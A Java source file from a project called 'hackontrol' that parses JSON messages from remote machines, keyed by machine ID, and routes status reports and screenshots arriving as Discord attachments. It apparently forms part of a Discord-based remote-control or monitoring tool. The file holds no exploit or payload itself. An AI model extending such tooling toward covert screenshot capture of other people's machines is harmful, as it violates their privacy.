package com.khopan.hackontrol;

import java.util.List;

import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.node.ObjectNode;
import com.khopan.hackontrol.network.ResponseMode;

import net.dv8tion.jda.api.entities.Message.Attachment;

public class Response {
	private final Hackontrol hackontrol;
	private final ObjectMapper mapper;

	public Response(Hackontrol hackontrol) {
		this.hackontrol = hackontrol;
		this.mapper = new ObjectMapper();
	}

	public void parse(String response, List<Attachment> attachmentList) {
		if(response == null) {
			return;
		}

		JsonNode node;

		try {
			node = this.mapper.readTree(response);
		} catch(Throwable ignored) {
			return;
		}

		if(!(node instanceof ObjectNode)) {
			return;
		}

		ObjectNode objectNode = (ObjectNode) node;

		if(!objectNode.has("requestMode")) {
			return;
		}

		int mode = objectNode.get("requestMode").asInt(-1);

		if(mode < 0) {
			return;
		}

		if(!node.has("machineId")) {
			return;
		}

		String identifierText = node.get("machineId").asText();

		if(identifierText.length() != 36) {
			return;
		}

		MachineId identifier = new MachineId(identifierText);

		switch(mode) {
		case ResponseMode.STATUS_REPORT:
			this.hackontrol.statusReport(identifier, objectNode);
			break;
		case ResponseMode.SCREENSHOT_TAKEN:
			if(attachmentList.isEmpty()) {
				return;
			}

			this.hackontrol.screenshotTaken(identifier, attachmentList.get(0));
			break;
		}
	}
}
